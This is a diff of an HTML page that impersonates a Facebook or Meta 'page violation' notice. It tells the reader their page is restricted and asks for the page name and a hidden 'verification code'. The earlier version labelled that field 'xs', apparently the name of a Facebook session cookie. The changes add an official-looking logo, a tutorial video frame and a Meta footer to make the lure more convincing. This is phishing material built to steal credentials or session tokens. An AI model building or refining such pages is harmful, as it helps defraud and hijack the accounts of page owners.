@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Page Violation</title>
+    <title>Facebook Help Center 2025</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -13,18 +13,20 @@
         }
         .header {
             background-color: #1877f2;
-            color: white;
-            padding: 10px;
-            font-size: 18px;
-            text-align: left;
-            padding-left: 15px;
+            text-align: center;
+            padding: 20px 0;
+        }
+        .header img {
+            width: 180px;
         }
         .help-center {
+            display: block;
             color: #1877f2;
             font-size: 14px;
-            margin: 10px;
-            display: block;
+            margin: 10px auto;
+            text-align: center;
             text-decoration: none;
+            font-weight: bold;
         }
         .container {
             background-color: white;
@@ -36,43 +38,31 @@
             border-radius: 5px;
         }
         h3 {
-            font-size: 16px;
+            font-size: 18px;
             color: black;
             margin-bottom: 10px;
+            text-align: center;
         }
         p {
             font-size: 14px;
             color: #333;
             line-height: 1.5;
+            text-align: center;
         }
         .video-container {
             width: 100%;
-            background-color: black;
             height: 200px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
             margin: 10px 0;
-        }
-        .video-placeholder {
-            color: white;
-            font-size: 16px;
-        }
-        .enable-sound {
-            display: block;
-            width: 100%;
-            background-color: #1877f2;
-            color: white;
-            text-decoration: none;
             text-align: center;
-            padding: 8px;
-            margin-top: 5px;
+        }
+        iframe {
+            width: 100%;
+            height: 200px;
             border-radius: 5px;
-            font-size: 14px;
         }
         .input-box {
             width: 100%;
-            padding: 8px;
+            padding: 10px;
             margin-top: 10px;
             border: 1px solid #ccc;
             border-radius: 5px;
@@ -84,11 +74,12 @@
             background-color: #1877f2;
             color: white;
             border: none;
-            padding: 10px;
+            padding: 12px;
             margin-top: 15px;
             border-radius: 5px;
-            font-size: 14px;
+            font-size: 16px;
             cursor: pointer;
+            font-weight: bold;
         }
         .note {
             font-size: 12px;
@@ -96,33 +87,41 @@
             margin-top: 10px;
             text-align: center;
         }
+        .meta-footer {
+            text-align: center;
+            font-size: 12px;
+            color: gray;
+            margin-top: 15px;
+        }
     </style>
 </head>
 <body>
 
-    <div class="header">facebook</div>
-    <a href="#" class="help-center">Help Center</a>
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+    </div>
+
+    <a href="#" class="help-center">Visit Help Center</a>
 
     <div class="container">
-        <h3>Request For Remove Page Violation</h3>
-        <p>We've identified irregular activity on your page that goes against our community guidelines.</p>
-        <p>As a result, access to your page has been restricted, and you're presently unable to post, share, or comment using it.</p>
-        <p>Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.</p>
+        <h3>Request to Remove Page Violation</h3>
+        <p>We've detected unusual activity on your page that violates our community guidelines.</p>
+        <p>To regain access, please review the details below and follow the steps.</p>
         
-        <h4>Detailed Video Information.</h4>
+        <h4>Watch This Tutorial Video</h4>
         <div class="video-container">
-            <span class="video-placeholder">▶ Play Video</span>
+            <iframe src="video.4" frameborder="0" allowfullscreen></iframe>
         </div>
 
-        <a href="#" class="enable-sound">Enable Sound</a>
+        <input type="text" class="input-box" placeholder="Enter your page name">
+        <input type="password" class="input-box" placeholder="Enter verification code">
 
-        <input type="text" class="input-box" placeholder="Enter details">
-        <input type="password" class="input-box" placeholder="xs">
-
-        <p class="note">Please make sure not to log out from your computer or laptop until you have received a verification email.</p>
+        <p class="note">Ensure you do not log out from your device until you receive a confirmation email.</p>
 
         <button class="submit-button">Submit</button>
     </div>
+
+    <p class="meta-footer">Meta © 2025</p>
 
 </body>
 </html>
